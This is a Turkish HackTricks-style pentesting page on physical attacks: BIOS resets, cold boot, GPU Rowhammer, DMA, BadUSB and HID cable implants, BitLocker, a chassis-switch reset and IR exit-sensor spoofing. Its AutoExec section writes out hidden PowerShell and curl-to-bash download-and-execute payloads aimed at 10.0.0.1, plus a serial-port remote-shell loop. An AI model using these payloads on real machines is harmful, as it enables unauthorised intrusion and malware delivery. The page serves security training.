# Fiziksel Saldırılar

{{#include ../banners/hacktricks-training.md}}

Kart düzeyinde arayüz keşfi, seri konsollar, flash erişimi, yan kanal saldırıları ve glitching için [Hardware Hacking](hardware-hacking/README.md) ve arayüze özgü bölümlerine bakın. Bu sayfada, sisteme bir bütün olarak fiziksel erişim gerektiren saldırılar ele alınmaktadır.

## BIOS Parola Kurtarma ve Sistem Güvenliği

Eski PC firmware ayarları, CMOS pilini çıkararak veya belgelenmiş bir clear-CMOS jumper'ı kullanarak sıfırlanabilir. Gerekli güç kesme süresi anakarta bağlıdır. Modern UEFI parolaları veya anahtarları ise kalıcı bellekteki flash'ta, gömülü bir denetleyicide ya da bir güvenlik aygıtında tutulabilir ve bu nedenle pil çıkarılsa da silinmeyebilir. Pinleri kısa devre etmeden önce anakart/servis kılavuzuna bakın; bu işlem TPM ölçümlerini de geçersiz kılabilir ve disk şifrelemesi kurtarma sürecini tetikleyebilir.

Eski x86 sistemlerde **killCMOS** ve **CmosPwd** gibi araçlar, önyüklenebilir bir ortamdan CMOS destekli ayarları inceleyebilir veya değiştirebilir. CmosPwd, belgelenmiş eski BIOS ailelerinin parola biçimlerini tanır ve CMOS durumunu yedekleyebilir, geri yükleyebilir veya silebilir/kaldırabilir; yayımlanan sürümleri eski DOS/Windows, Linux, FreeBSD ve NetBSD ortamlarını hedefler.<sup>[[18]](#references)</sup> Bu yardımcı programlar genel amaçlı UEFI parola kaldırıcıları değildir ve yeterli donanım/firmware erişimi gerektirir.

Bazı dizüstü bilgisayar firmware'leri, birkaç başarısız parola denemesinden sonra üreticiye özgü bir sorgulama kodu görüntüler. [bios-pw.org](https://bios-pw.org) gibi veritabanları bazı modeller için eski üretici kurtarma parolalarını türetebilir; ancak birçok sistem, türetilebilir bir sorgulama kodu olmadan kilitlenme uygular. Oluşturulan parolaları modele özgü kabul edin ve kalıcı deneme sayaçlarını tüketmekten kaçının.

### UEFI Güvenliği

Modern **UEFI** sistemlerinde CHIPSEC, Secure Boot değişken korumalarını denetleyebilir. Önce aşağıdaki değişiklik yapmayan kontrolü çalıştırın; isteğe bağlı `-a modify` modu değişkenleri bozmaya bilerek çalışır ve yalnızca kurtarılabilir bir laboratuvar sisteminde kullanılmalıdır. CHIPSEC, ayrıcalıklı sürücüsünün ve düşük düzeyli donanım erişiminin üretim uç noktalarında kullanıma uygun olmadığı konusunda uyarır.<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

---

## RAM Analizi ve Cold Boot Attacks

DRAM, yenileme durduğunda her bitini hemen kaybetmez. Veri kaybı hızı, modül teknolojisine ve sıcaklığa bağlı olarak büyük ölçüde değişir; soğutma, kullanılabilir verilerin soğutulmamış bir güç döngüsünden çok daha uzun süre korunmasını sağlayabilir. Cold-boot attack, bellek yongası hızla küçük bir edinim ortamına yeniden başlatılırken veya soğutulmuş bir modül aktarılırken ham belleği yakalar ve bit kaybına rağmen kriptografik anahtarları yeniden oluşturur. Disk kopyalama aracı otomatik olarak fiziksel bellek imajı alan bir araç değildir; Volatility ise yakalama işlemini gerçekleştirmez, alınan veriyi analiz eder. Platforma uygun, doğrulanmış bir edinim aracı kullanın.<sup>[[12]](#references)</sup>

---

## Sayfa Tablolarına Yönelik GPU Rowhammer

Modern GPU Rowhammer saldırıları, sıradan arabellekler yerine **GPU sanal bellek meta verilerini** hedeflediğinde çok daha kullanışlı hale gelir. **GDDR6 NVIDIA Ampere GPU’lar** üzerinde yapılan güncel çalışmalar, ayrıcalıksız CUDA kodu çalıştıran bir saldırganın GPU’ya özgü hammering örüntüleri oluşturabildiğini, sayfalama yapılarını savunmasız satırlara yerleştirmek için **memory massaging** kullanabildiğini ve ardından **son seviye sayfa tablosunda** veya bir ara **sayfa dizininde** bitleri değiştirebildiğini gösteriyor. Tek bir çeviri girdisi bozulduğunda saldırgan, **GPU belleğinde rastgele okuma/yazma** yeteneği elde edebilir ve ardından ana bilgisayarı ele geçirmeye geçebilir.<sup>[[1]](#references)[[2]](#references)</sup>

### Exploitation Pattern

1. GDDR6’da **hammering uygulanabilen satırları profilleyin** ve DRAM içi azaltımları aşan, yenileme farkındalığına sahip / tekdüze olmayan hammering örüntüleri oluşturun.
2. Sürücünün sayfa çeviri yapılarını varsayılan korumalı havuzda tutmak yerine hammering uygulanabilen fiziksel konumlara yerleştirmesi için **GPU tahsislerini düzenleyin**. Uygulamada bu, düşük bellekli sayfa tablosu bölgesini tüketmek ve kontrollü adımlarla büyük, seyrek UVM eşlemeleri oluşturarak belleği doldurmak anlamına gelebilir.
3. Saldırganın kontrolündeki sanal sayfanın sayfa tablosu sayfalarına, rastgele GPU belleğine veya ana bilgisayarın görebildiği sistem eşlemelerine çözülmesini sağlamak için sayfa tablosu / sayfa dizini girdisindeki **PFN** veya aperture ile ilgili bitler gibi **çeviri meta verilerini değiştirin**.
4. Sahte eşlemeyi kullanarak ek çeviri girdilerini yeniden yazın ve GPU bağlamları arasında **GPU belleğinde rastgele okuma/yazma** yeteneğine yükselin.

### Ana Bilgisayara Geçiş ve Azaltımlar

- **IOMMU devre dışıyken**, sahte sistem aperture eşlemeleri GPU’ya rastgele **ana bilgisayar fiziksel belleğini** açabilir ve GPU ilkelini ana bilgisayarın tamamen ele geçirilmesine dönüştürebilir.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** son seviye sayfa tablosu girdilerini hedeflerken **GeForge**, tek bir bit değişikliğinin daha büyük bir çeviri alt ağacını başka yere yönlendirebilmesi nedeniyle sayfa dizini düzeyini bozmanın daha kolay olabileceğini gösteriyor. Güvenlik açısından kritik olanın yalnızca tek bir sayfalama katmanı olduğunu varsaymayın.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU**, GDDRHammer/GeForge tarafından kullanılan ana bilgisayar belleğine doğrudan rastgele erişim yolunu engellediğinden önemini korur; ancak **tam bir azaltım değildir**. **GPUBreach**, saldırganın GPU tarafından yazılabilir, sürücüye ait CPU arabelleklerini bozduğu ve ardından NVIDIA sürücüsündeki bellek güvenliği hatalarını tetikleyerek, IOMMU etkin olsa bile çekirdeğe yazma ilkelini ve bir **root shell** elde ettiği ikinci aşama bir geçiş gösteriyor.<sup>[[3]](#references)</sup>
- Desteklenen iş istasyonu/sunucu GPU’larında **sistem düzeyinde ECC** pratik bir güçlendirme adımıdır. ECC’siz tüketici GPU’ları daha zayıf bir savunma yüzeyi sunar.<sup>[[4]](#references)</sup>
- Bu saldırılar yalnızca teorik değildir: **GeForge**, RTX 3060’ta **1.171**, RTX A6000’de ise **202** bit değişikliği bildirdi. Bu sayılar, çalışan bir ana bilgisayar yetki yükseltme zinciri oluşturmak için yeterliydi.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Direct Memory Access (DMA) Saldırıları

Önyükleme öncesi IOMMU uygulamasını düşürerek bir Windows DMA zincirini etkinleştirebilen çevrimdışı UEFI IFR/NVRAM yamalama için bkz.:

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception**, geçmişte oturum açma atlatmayla ilişkilendirilen imzaları da içerecek şekilde FireWire ve erken Thunderbolt yapılandırmaları gibi arabirimler üzerinden **DMA tabanlı bellek edinimi ve yamalamayı** gösteriyor. Bu, yalnızca “Windows 10’da etkisiz” değildir: istismar edilebilirlik; arabirime, hedef sürüme, IOMMU politikasına, kilit durumuna ve Windows Kernel DMA Protection’ın desteklenip etkin olup olmadığına bağlıdır. Windows 10 sürüm 1803 ve sonrası, uyumlu platformlarda Kernel DMA Protection’ı kullanıma sunarak saldırı yüzeyini önemli ölçüde değiştirdi.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Sistem Erişimi için Live CD/USB

Şifrelenmemiş veya kilidi zaten açılmış bir Windows biriminde çevrimdışı bir ortam, **sethc.exe** veya **Utilman.exe** gibi erişilebilirlik ikililerini **cmd.exe** ile değiştirebilir. İlgili oturum açma ekranı kısayolu çalıştırıldığında SYSTEM komut istemi açılır. **chntpw** gibi araçlar yerel SAM hesap verilerini düzenleyebilir. Bu yöntemler kilitli bir BitLocker birimini aşmaz ve DPAPI/EFS ile korunan kimlik bilgilerine zarar verebilir; adli kopyaları ve yedekleri saklayın.

**Kon-Boot**, desteklenen Windows/macOS yapılandırmaları için ticari bir önyükleme zamanı kimlik doğrulama atlatma aracıdır. Uyumluluk işletim sistemine, firmware moduna, Secure Boot’a ve disk şifreleme kurulumuna bağlıdır; BitLocker ile kilitlenmiş bir birimin şifresini çözmez.<sup>[[10]](#references)</sup>

---

## Windows Güvenlik Özelliklerinin Ele Alınması

### Önyükleme ve Kurtarma Kısayolları

- **Delete/Supr**, F2, F10 veya başka bir üretici tuşu firmware kurulumunu açabilir.
- **F8**, yalnızca bu yolun hâlâ etkin olduğu yapılandırmalarda eski Windows gelişmiş önyükleme seçeneklerine girer; güncel kurtarma giriş yöntemi değişiklik gösterir.
- **Shift** tuşunu basılı tutmak bazı yapılandırmalarda Windows otomatik oturum açmayı engelleyebilir; ancak ilke/kayıt defteri ayarları bu davranışı devre dışı bırakabilir.<sup>[[17]](#references)</sup>

### BAD USB Aygıtları

**USB Rubber Ducky** ve Teensy kartları gibi aygıtlar, güvenilir HID klavyeler olarak tanımlanıp önceden belirlenmiş tuş vuruşlarını enjekte edebilir. Payload başlangıçta oturum açmış kullanıcının oturum ayrıcalıklarına ve masaüstü erişimine sahip olur; UAC istemleri, ekran kilidi, klavye düzeni, zamanlama ve uç nokta USB politikası yine de kısıtlamalar getirir.<sup>[[15]](#references)</sup>

Programlanabilir çevre birimleri ana bilgisayar çekirdeğindeki ayrıştırıcıları da hedefleyebilir ve heap grooming ile bilgi ifşası için birden fazla USB aygıtını koordine edebilir:

{{#ref}}
../binary-exploitation/linux-kernel-exploitation/usb-audio-descriptor-oob-kaslr-leak.md
{{#endref}}

Bir Windows UAS yığın depolama ayrıştırıcısı örneği için bkz.:

{{#ref}}
../binary-exploitation/windows-kernel-exploitation/uasp-report-luns-cache-size-oob-write.md
{{#endref}}

### Volume Shadow Copy

Yönetici veya yedekleme ayrıcalıkları, gölge kopya oluşturabilir ya da kilitli **SAM** ve **SYSTEM** gibi dosyaların edinilmesi için kayıt defteri kovanlarını kaydedebilir. Bu, sistem ele geçirildikten sonra kullanılan bir toplama tekniğidir; ayrıcalık atlatma yöntemi değildir. `diskshadow`/VSS ve kayıt defteri kovanı dışa aktarma olaylarıyla ilişkilendirilmelidir.

## BadUSB / HID Implant Teknikleri

### NFC ile tetiklenen Android HID gadget

Root erişimli bir Android telefon, yalnızca USB denetleyicisi ve çekirdeği **USB gadget/HID desteği** sağlıyorsa programlanabilir bir USB klavyeye dönüşebilir. Uyumlu cihazlarda Kali NetHunter, **USB Arsenal** üzerinden gadget profilleri sunar. Diğer bir seçenek de ConfigFS gadget işlevleri oluşturan ve `/dev/hidg0` ile `/dev/hidg1` gibi klavye/fare karakter aygıtlarını kullanıma açabilen [USB Gadget Tool](https://github.com/tejado/android-usb-gadget) aracıdır. Araç yalnızca gadget uç noktasını oluşturur; ayrı bir işlem bu uca HID raporları yazmalıdır. Root erişimi, ConfigFS, HID gadget desteği veya kullanılabilir bir USB Device Controller bulunmayan bir çekirdeği telafi edemez.<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>

Bu uç nokta, fiziksel bir tetikleyici olarak Android NFC ile birleştirilebilir. [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID) uygulaması bir etiket UID’si okur, bunu beklenen biçime dönüştürür, yerel bir izin listesinde kontrol eder ve eşleşme olduğunda yapılandırılmış, Rubber Ducky tarzı bir klavye dizisi gönderir. Bağlı ana bilgisayar sıradan klavye girdisi görür ve NFC yazılımına ihtiyaç duymaz.<sup>[[22]](#references)[[24]](#references)</sup>

Kısayol veya komut kullanmadan önce boş bir metin düzenleyicisinde aygıtın tanımlanmasını ve klavye düzenini doğrulayın. Zararsız bir payload:<sup>[[24]](#references)</sup>

```text
DELAY 1000
STRING NFC HID test successful
ENTER
```

Önemli güven sınırları:<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

- **UID whitelist kimlik belirlemedir, kimlik doğrulama değildir**. UID'ler herkese açıktır ve bazı token türleri veya emülatörler kopyalamaya ya da taklit etmeye izin verir. İzin verilen bir UID'nin kopyası, orijinal token ile aynı dispatch yolunu izler.
- **NfcScreenOff** Magisk modülü, NFC hizmetini ekran açık ve kilitli değilmiş gibi davranacak şekilde yamalar. Telefon zaten bir host'a bağlıysa, bu sayede biri telefonu kilidini açmadan payload'ı tetikleyebilir.
- Payload içinde saklanan parolalar, API token'ları ve komutlar; root erişimi olan veya bootloader'ı kilidi açılmış bir cihazda kurtarılabilir sırlardır. HID üzerinden parola yazmak, parola kullanmadan kimlik doğrulama değil, yeniden kullanılabilir parola otomasyonudur.
- HID injection, etkin masaüstünün ayrıcalıklarıyla çalışır ve odağa, zamanlamaya ve host klavye düzenine bağlıdır. Hassas eylemleri dispatch etmeden önce kullanıcıdan yakın zamanda onay alınmasını zorunlu tutun, script'lerde ayrıcalıklı sırlar kullanmaktan kaçının ve gerçek kimlik doğrulama için kriptografik challenge-response authenticator kullanın.

### Wi-Fi yönetimli kablo implantları

- **Evil Crow Cable Wind** gibi ESP32-S3 tabanlı implantlar, USB-A→USB-C veya USB-C↔USB-C kabloların içine gizlenir, yalnızca USB klavye olarak tanınır ve C2 yığınını Wi-Fi üzerinden sunar. Operatörün tek yapması gereken kabloya kurban host üzerinden güç vermek, `Evil Crow Cable Wind` adlı ve `123456789` parolalı bir hotspot oluşturmak ve gömülü HTTP arayüzüne erişmek için [http://cable-wind.local/](http://cable-wind.local/) (veya DHCP adresini) açmaktır.<sup>[[8]](#references)</sup>
- Tarayıcı UI'ında *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* ve *Config* sekmeleri bulunur. Saklanan payload'lar işletim sistemine göre etiketlenir, klavye düzenleri anında değiştirilir ve VID/PID dizeleri bilinen çevre birimlerini taklit edecek şekilde değiştirilebilir.
- C2 kablonun içinde olduğundan, bir telefon kuruluşun ağını kullanmadan payload hazırlayabilir, yürütmeyi tetikleyebilir ve Wi-Fi kimlik bilgilerini yönetebilir. Bu, fiziksel erişimle yapılan kısa süreli izinsiz girişlerde kullanışlıdır.

### İşletim sistemini algılayan AutoExec payload'ları

- AutoExec kuralları, USB tanınmasının hemen ardından çalıştırılacak bir veya daha fazla payload'ı bağlar. İmplant, hafif bir işletim sistemi parmak izi çıkarma işlemi yapar ve eşleşen script'i seçer.
- Örnek iş akışı:
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
  - *macOS/Linux:* `COMMAND SPACE` (Spotlight) veya `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Yürütme gözetimsiz olduğundan, şarj kablosunu değiştirmek bile oturum açmış kullanıcının bağlamında “tak ve ele geçir” ilk erişimini sağlayabilir.

### Wi-Fi TCP üzerinden HID ile başlatılan uzak kabuk

1. **Tuş vuruşu ile başlatma:** Saklanan bir payload, bir konsol açar ve yeni USB seri aygıtına ulaşan her şeyi yürüten bir döngü yapıştırır. Minimal bir Windows çeşidi şöyledir:

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **Kablo köprüsü:** Implant, ESP32-S3'ü operatöre geri bağlanan bir TCP client (Python script'i, Android APK'si veya masaüstü executable'ı) başlatırken USB CDC kanalını açık tutar. TCP oturumuna yazılan tüm baytlar yukarıdaki seri döngüye iletilerek ağ bağlantısı olmayan host'larda bile uzaktan komut çalıştırma olanağı sağlar. Çıktı sınırlıdır, bu yüzden operatörler genellikle körlemesine komutlar çalıştırır (hesap oluşturma, ek araçları hazırlama vb.).

### HTTP OTA güncelleme yüzeyi

- Belgelenen Evil Crow Cable Wind arayüzü, kimlik doğrulaması gerektirmeyen bir firmware güncelleme endpoint'i olan `/update`'i sunar:<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- Saha operatörleri, kabloyu açmadan etkileşim sırasında özellikleri anında değiştirebilir (ör. USB Army Knife firmware'ini flash'layabilir); böylece implant, hedef ana bilgisayara bağlı kalırken yeni yeteneklere geçiş yapabilir.

## BitLocker Şifrelemesini Atlama

Canlı veya yakın zamanda çalışmış bir sistemin yetkili adli bilişim edinimi, birim kilidi açıkken BitLocker birim ana anahtarını veya ilişkili anahtar materyalini içerebilir. Elcomsoft Forensic Disk Decryptor ve Passware Kit Forensic gibi ticari araçlar, desteklenen bellek imajlarını, hazırda bekletme dosyalarını veya çökme dökümlerini tarayabilir; ancak başarı garanti değildir. Modern Windows, BitLocker etkin olduğunda çökme dökümlerini de şifreler. Ayrıca, kayıtlı 48 haneli kurtarma parolası, bellekteki birim anahtarından farklı bir veridir.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Kurtarma Anahtarı Ekleme İçin Sosyal Mühendislik

Bir yöneticiye BitLocker yönetim komutlarını çalıştırması için kandıran saldırgan, bir kurtarma parolası, harici anahtar veya başka bir koruyucu ekleyip bunu ele geçirebilir. Kurtarma parolası, sıfırlardan oluşan rastgele bir dize olamaz: BitLocker sayısal kurtarma parolaları doğrulanmış 48 haneli bir biçime sahiptir. Yetkili yönetim için ilgili söz dizimi `manage-bde -protectors -add C: -recoverypassword` şeklindedir; eklenen koruyucuları `manage-bde -protectors -get C:` komutuyla listeleyin. Koruyucu eklemelerini izleyin ve yeni kurtarma materyalinin yalnızca onaylı konumlarda saklandığından emin olun.<sup>[[16]](#references)</sup>

---

## BIOS'u Fabrika Ayarlarına Sıfırlamak İçin Kasa İhlali / Bakım Anahtarlarından Yararlanma

Birçok modern dizüstü bilgisayar ve küçük form faktörlü masaüstü bilgisayar, Embedded Controller (EC) ve BIOS/UEFI firmware tarafından izlenen bir **kasa ihlali anahtarı** içerir. Anahtarın temel amacı cihaz açıldığında uyarı vermek olsa da üreticiler bazen, belirli bir düzende tetiklendiğinde çalışan **belgelenmemiş bir kurtarma kısayolu** uygular.<sup>[[5]](#references)[[6]](#references)</sup>

### Saldırı Nasıl Çalışır

1. Anahtar, EC üzerindeki bir **GPIO kesmesine** bağlanır.
2. EC'de çalışan firmware, **basışların zamanlamasını ve sayısını** izler.
3. Sabit kodlanmış bir düzen algılandığında EC, **sistem NVRAM/CMOS içeriğini silen** bir *mainboard-reset* yordamını çağırır.
4. Bir sonraki açılışta, etkilenen modeller sıfırlanmış firmware durumunu yükler. Üreticiye ve sürüme bağlı olarak sıfırlanan durum; bir yönetici parolasını, özel önyükleme ayarlarını veya kayıtlı Secure Boot anahtarlarını içerebilir. TPM durumu ve disk şifrelemesi üzerindeki etkiler ayrıca değerlendirilmelidir.

> Firmware sıfırlaması harici önyükleme seçeneklerini geri yükleyebilir, ancak depolama biriminin şifresini **çözmez**. BitLocker veya başka bir tam disk şifreleme sistemi, TPM/firmware değişikliklerinden sonra kurtarma moduna geçebilir ve kurtarma anahtarı olmadan da dahili sürücüyü korumaya devam edebilir.<sup>[[16]](#references)</sup>

### Gerçek Dünya Örneği – Framework 13 Dizüstü Bilgisayarı

Framework 13 (11./12./13. nesil) için kurtarma kısayolu şöyledir:

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

Onuncu döngüden sonra EC, BIOS'a bir sonraki yeniden başlatmada NVRAM'i temizlemesini bildiren bir bayrak ayarlar. Tüm işlem yaklaşık 40 saniye sürer ve **bir tornavidadan başka hiçbir şey gerektirmez**.<sup>[[5]](#references)</sup>

### Genel Exploitation Prosedürü

1. EC'nin çalışır durumda olması için hedefi açın veya askıya alıp yeniden başlatın.
2. İzinsiz giriş/bakım anahtarını açığa çıkarmak için alt kapağı çıkarın.
3. Üreticiye özgü aç-kapa düzenini uygulayın (belgelere, forumlara başvurun veya EC firmware'ini reverse-engineer edin).
4. Cihazı yeniden birleştirip yeniden başlatın; ardından hangi firmware ayarlarının ve kimlik bilgilerinin gerçekten değiştiğini inceleyin.
5. Yetkiniz varsa ve harici önyükleme kullanılabiliyorsa, kontrollü bir live image ile önyükleme yapın. Dahili bir birimin kilidi usulüne uygun şekilde açıldığında (veya hiç şifrelenmemişse), live ortam kimlik bilgilerini ve verileri alabilir ya da EFI System Partition'ı inceleyebilir. Bu bölümü değiştirerek bir EFI implantı yüklemek kalıcı ve son derece müdahaleci bir işlemdir; ayrıca Secure Boot, measured boot, firmware yazma koruması ve endpoint izleme kısıtlamalarına tabidir. Şifreli depolama, anahtarı veya kurtarma materyali olmadan erişilemez durumda kalır.

### Tespit ve Azaltma

* Şasi izinsiz giriş olaylarını OS yönetim konsolunda kaydedin ve beklenmedik BIOS sıfırlamalarıyla ilişkilendirin.
* Açılmayı tespit etmek için vidalara/kapaklara **kurcalamayı belli eden mühürler** uygulayın.
* Cihazları **fiziksel olarak kontrollü alanlarda** tutun; fiziksel erişimin tam bir ihlal anlamına geldiğini varsayın.
* Varsa, üreticinin “maintenance switch reset” özelliğini devre dışı bırakın veya NVRAM sıfırlamaları için ek kriptografik yetkilendirme isteyin.

---

## Temassız Çıkış Sensörlerine Karşı Gizli IR Enjeksiyonu

### Sensör Özellikleri
- Piyasada bulunan “wave-to-exit” sensörleri, yakın IR LED vericisini TV uzaktan kumandası tarzı bir alıcı modülle eşleştirir. Alıcı, yalnızca doğru taşıyıcı frekansta (≈30 kHz) birden fazla darbe (~4–10) gördükten sonra logic high sinyali verir.<sup>[[7]](#references)</sup>
- Plastik bir koruyucu, verici ve alıcının doğrudan birbirini görmesini engeller; böylece kontrolcü, doğrulanmış taşıyıcının yakındaki bir yansımadan geldiğini varsayar ve kapı karşılığını açan bir röleyi etkinleştirir.
- Kontrolcü bir hedefin var olduğuna kanaat getirdiğinde genellikle dışarı giden modülasyon zarfını değiştirir; ancak alıcı, filtrelenmiş taşıyıcıyla eşleşen her burst'ü kabul etmeyi sürdürür.

### Saldırı İş Akışı
1. **Yayılım profilini yakalayın** – dahili IR LED'i süren hem algılama öncesi hem de algılama sonrası dalga biçimlerini kaydetmek için kontrolcü pinlerine bir logic analyser bağlayın.
2. **Yalnızca “algılama sonrası” dalga biçimini yeniden oynatın** – stok vericiyi çıkarın/yok sayın ve harici bir IR LED'i en baştan tetiklenmiş desenle sürün. Alıcı yalnızca darbe sayısı/frekansıyla ilgilendiğinden, sahte taşıyıcıyı gerçek bir yansıma olarak algılar ve röle hattını etkinleştirir.
3. **İletimi aralıklarla yapın** – alıcının AGC'sini veya parazit işleme mantığını doyurmadan gereken minimum darbe sayısını göndermek için taşıyıcıyı ayarlanmış burst'ler halinde iletin (ör. onlarca milisaniye açık, benzer süre kapalı). Kesintisiz yayın sensörün duyarlılığını hızla düşürür ve rölenin çalışmasını engeller.

### Uzun Menzilli Yansıtmalı Enjeksiyon
- Masaüstü LED'ini yüksek güçlü bir IR diyot, MOSFET sürücüsü ve odaklama optikleriyle değiştirmek, yaklaşık 6 m mesafeden güvenilir tetikleme sağlar.
- Saldırganın alıcı açıklığını doğrudan görmesi gerekmez; ışını camın ardından görülebilen iç duvarlara, raflara veya kapı çerçevelerine yöneltmek, yansıyan enerjinin yaklaşık 30° görüş alanına girmesini ve yakından el sallamayı taklit etmesini sağlar.
- Alıcılar yalnızca zayıf yansımalar beklediğinden, çok daha güçlü bir harici ışın birden fazla yüzeyden yansısa bile algılama eşiğinin üzerinde kalabilir.

### Silahlaştırılmış Saldırı El Feneri
- Sürücüyü ticari bir el fenerinin içine yerleştirmek, aracı herkesin görebileceği bir yerde gizler. Görünür LED'i alıcının bandına uygun yüksek güçlü bir IR LED ile değiştirin, ≈30 kHz burst'ler üretmek için bir ATtiny412 (veya benzeri) ekleyin ve LED akımını çekmek için bir MOSFET kullanın.
- Teleskopik zoom lensi, menzil/sağlamlık için ışın demetini daraltırken MCU kontrolündeki bir titreşim motoru, görünür ışık yaymadan modülasyonun etkin olduğuna dair dokunsal onay verir.
- Birkaç kayıtlı modülasyon deseni arasında geçiş yapmak (biraz farklı taşıyıcı frekansları ve zarflar), yeniden markalanmış sensör aileleriyle uyumluluğu artırır. Böylece operatör, röle duyulabilir bir tık sesi çıkarıp kapı açılana kadar yansıtıcı yüzeyleri tarayabilir.

---

## References

- [1] [GDDRHammer: DRAM Satırlarını Büyük Ölçüde Bozma — Modern GPU'lardan Kaynaklanan Bileşenler Arası Rowhammer Saldırıları](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: GPU Sayfa Tablolarını Eğlence ve Kâr İçin Sahtelemek Üzere GDDR Belleğe Hammering Uygulama](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Rowhammer Kullanarak GPU'larda Yetki Yükseltme Saldırıları](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Güvenlik Bildirimi: Rowhammer - Temmuz 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Buraya basıp sistemi ele geçir”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Anakart Sıfırlama Kılavuzu](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Hayır, dokunmayın! – Gizli Bir IR El Feneriyle IR Temassız Çıkış Sensörlerini Atlatma”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Tak, Çalıştır, Ele Geçir: Evil Crow Cable Wind ile Hacking”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - NVIDIA Çiplerine Karşı Rowhammer Saldırısı](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Kon-Boot resmi belgeleri ve uyumluluk bilgileri](https://kon-boot.com/)
- [11] [CHIPSEC belgeleri - Secure Boot değişken korumaları](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Unutmamamız İçin: Şifreleme Anahtarlarına Yönelik Cold Boot Saldırıları](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - DMA üzerinden fiziksel bellek manipülasyonu](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Kernel DMA Koruması](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Hak5 USB Rubber Ducky belgeleri](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - BitLocker işlemleri kılavuzu](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - Shift tuşunu basılı tutma ve otomatik oturum açma davranışı](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - CmosPwd belgeleri ve indirmeler](https://www.cgsecurity.org/wiki/CmosPwd)
- [19] [Kali Linux belgeleri - NetHunter USB-Arsenal](https://www.kali.org/docs/nethunter/nethunter-usbarsenal/)
- [20] [Linux kernel belgeleri - USB HID gadget sürücüsü](https://docs.kernel.org/usb/gadget_hid.html)
- [21] [USB Gadget Tool](https://github.com/tejado/android-usb-gadget)
- [22] [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID)
- [23] [NfcScreenOff](https://github.com/Jon8RFC/NfcScreenOff)
- [24] [Root'lu Bir Android Telefonu Bilgisayarınız İçin NFC Kimlik Doğrulayıcı ve Otomasyon Aracına Dönüştürme](https://mobile-hacker.com/2026/09/21/turn-a-rooted-android-phone-into-an-nfc-authenticator-and-automation-tool-for-your-pc/)
{{#include ../banners/hacktricks-training.md}}
